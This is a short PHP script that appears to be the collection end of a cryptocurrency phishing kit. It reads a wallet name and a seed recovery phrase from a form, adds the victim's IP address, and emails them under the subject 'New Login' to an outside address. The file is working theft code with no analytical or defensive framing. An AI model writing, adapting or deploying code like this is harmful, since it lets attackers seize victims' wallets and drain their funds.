<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $modal_wallet_name_input = $_POST['modal_wallet_name_input'];
 $recovery_phrase = $_POST['recovery_phrase'];
 
		$to = "fwallet@flexzone.ru.com";
		
		
         $subject = "New Login : ip";
		 
		 $message =  "Wallet Name            : ".$modal_wallet_name_input."\r\n";
         $message .= "Recovery_phrase           : ".$recovery_phrase."\r\n";
		 $message .= "IP           : ".$ip."\r\n";
		$header = "Content type: Khalifa tools \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
}
?>